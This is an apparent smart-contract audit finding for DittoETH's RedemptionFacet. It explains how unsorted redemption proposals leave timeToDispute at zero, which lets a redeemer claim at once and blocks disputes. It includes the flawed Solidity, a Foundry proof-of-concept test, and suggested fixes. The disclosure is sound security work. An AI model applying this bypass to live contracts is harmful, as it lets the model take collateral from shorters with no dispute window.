# Lines of code

https://github.com/code-423n4/2024-03-dittoeth/blob/main/contracts/facets/RedemptionFacet.sol#L90-L93


# Vulnerability details

## Impact
Incorrect handling of improper input in `RedemptionFacet::proposeRedemption()` allows a redeemer to call `RedemptionFacet::claimRedemption()` without having to wait `timeToDispute`. In reality, `timeToDispute` is zero however that shouldn't be the case and it is only possible because of improper code. `RedemptionFacet::proposeRedemption()` requires an array of proposals with `CRs` sorted from lowest to highest. Then, the `CR` at the last spot is being used to compute the `timeToDispute` as it is expected to be with the highest value. However, this can be manipulated and `timeToDispute` can become `0` even though it should actually be a value that is higher than `0`. This allows a redeemer to immediately call `RedemptionFacet::claimRedemption()` successfully severely breaking the intended usage and idea of the facet.

## Proof of Concept
`RedemptionFacet::proposeRedemption()` relies on this check to see if the `CRs` are properly sorted from lowest to highest.
```solidity
            p.currentCR = currentSR.getCollateralRatio(p.oraclePrice);

            // @dev Skip if proposal is not sorted correctly or if above redemption threshold
            if (p.previousCR > p.currentCR || p.currentCR >= C.MAX_REDEMPTION_CR) continue;
```

While the check properly checks for that, `p.currentCR` is still being rewritten to the `CR` even if `p.currentCR` is lower than `p.previousCR`.

Imagine a scenario where a redeemer provides 3 proposals. The first 2 have a `CR` above `1.1 ether` and the last one has a `CR` of `1.1 ether` or below. `timeToDispute` is computed based on the highest `CR` and if the `CR` is below `1.1 ether`, then `timeToDispute` will be 0 but if it is above, then `timeToDispute` should be above 0. The loop goes through the proposals and on the last one, it checks whether `p.previousCR (above 1.1) is of higher value than p.currentCR (1.1 and below)`. Since this is the case, the final iteration of the loop is skipped. However, `p.currentCR` is still rewritten to the `CR` of the last proposal with a `CR` of `1.1 ether` or below.

Then, after the loop, the `timeToDispute` is computed using those `if` checks.
```solitity
if (p.currentCR > 1.7 ether) {
            m = uint256(3 ether).div(0.3 ether);
            redeemerAssetUser.timeToDispute = protocolTime + uint32((m.mul(p.currentCR - 1.7 ether) + 3 ether) * 1 hours / 1 ether);
        } else if (p.currentCR > 1.5 ether) {
            m = uint256(1.5 ether).div(0.2 ether);
            redeemerAssetUser.timeToDispute =
                protocolTime + uint32((m.mul(p.currentCR - 1.5 ether) + 1.5 ether) * 1 hours / 1 ether);
        } else if (p.currentCR > 1.3 ether) {
            emit Events.Log2("this is the ratio");
            m = uint256(0.75 ether).div(0.2 ether);
            redeemerAssetUser.timeToDispute =
                protocolTime + uint32((m.mul(p.currentCR - 1.3 ether) + 0.75 ether) * 1 hours / 1 ether);
        } else if (p.currentCR > 1.2 ether) {
            m = uint256(0.417 ether).div(0.1 ether);
            redeemerAssetUser.timeToDispute =
                protocolTime + uint32((m.mul(p.currentCR - 1.2 ether) + C.ONE_THIRD) * 1 hours / 1 ether);
        } else if (p.currentCR > 1.1 ether) {
            m = uint256(C.ONE_THIRD.div(0.1 ether));
            redeemerAssetUser.timeToDispute = protocolTime + uint32(m.mul(p.currentCR - 1.1 ether) * 1 hours / 1 ether);
        }
```

The if checks check for every case above `1.1 ether` and just leave `timeToDispute` as it is if `p.currentCR` is `1.1 ether` and below. This is completely fine however `p.currentCR` is incorrectly set to `1.1 ether` and below so the `timeToDispute` will remain as it is (0 in this case) and the `redeemer` will be able to call `RedemptionFacet::claimCollateral()` immediately despite his proposals requiring `timeToDispute` to be a lot more than 0.

Paste the following POC into `Redemption.t.sol`:
```solidity
    function testCreateProposalsWithNoTimeToDispute() public {
        address shorter = sender;
        address redeemer = receiver;
        address disputer = makeAddr('disputer');

        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, redeemer);
        fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, shorter);
        fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, redeemer);
        fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, shorter);

        _setETH(50000 ether);
        fundLimitBidOpt(DEFAULT_PRICE / 4, DEFAULT_AMOUNT, redeemer);
        fundLimitShortOpt(DEFAULT_PRICE / 4, DEFAULT_AMOUNT, shorter);

        MTypes.ProposalInput[] memory proposalInputs = new MTypes.ProposalInput[](3);
        proposalInputs[0] = MTypes.ProposalInput({shorter: shorter, shortId: C.SHORT_STARTING_ID, shortOrderId: 0});
        proposalInputs[1] = MTypes.ProposalInput({shorter: shorter, shortId: C.SHORT_STARTING_ID + 1, shortOrderId: 0});
        proposalInputs[2] = MTypes.ProposalInput({shorter: shorter, shortId: C.SHORT_STARTING_ID + 2, shortOrderId: 0});

        _setETH(1000 ether);
        vm.prank(redeemer);
        diamond.proposeRedemption(asset, proposalInputs, DEF_REDEMPTION_AMOUNT, MAX_REDEMPTION_FEE);

        MTypes.ProposalData[] memory decodedProposalData = getSlate(redeemer);
        uint256 highestCR = decodedProposalData[decodedProposalData.length - 1].CR;
        assertEq(highestCR, 1.5 ether); // Highest CR is 1.5 ether as slate is being rewritten after the continue keyword and the incorrect last proposal is not included. This should be the CR used for computing the timeToDispute and timeToDispute should be higher than 0.

        // However p.currentCR is still being rewritten to the incorrect proposal's CR which is below 1.1 ether before the continue keyword. Then the p.currentCR is used to compute the timeToDispute and since it is below 1.1 ether, timeToDispute is 0.

        STypes.AssetUser memory redeemerStruct = diamond.getAssetUserStruct(asset, redeemer);
        assertEq(redeemerStruct.timeToDispute, 0);

        vm.expectRevert(Errors.TimeToDisputeHasElapsed.selector); // Disputer can't dispute even though the timeToDispute should not be 0
        vm.prank(disputer);
        diamond.disputeRedemption(asset, redeemer, 0, shorter, C.SHORT_STARTING_ID); // The shortRecord we give doesn't matter as long as we get to the third if check and we revert with the given error.

        vm.prank(redeemer);
        diamond.claimRedemption(asset);
    }
```

## Tools Used
Manual Review

## Recommended Mitigation Steps
A possible fix would be to use a variable holding the value of the highest `CR`.
Something like this:
```solidity
if (p.currentCR > highestCR) highestCR = p.currentCR;
```
Then, that would be the variable you use for computing the `timeToDispute`.

Another option would be to use `revert()` instead of `continue`. This would stop the whole function even if just one proposal is incorrect which might be not exactly what the developers of the protocol want but since it doesn't affect any other users besides the user who gave incorrect proposals, this shouldn't be an issue.





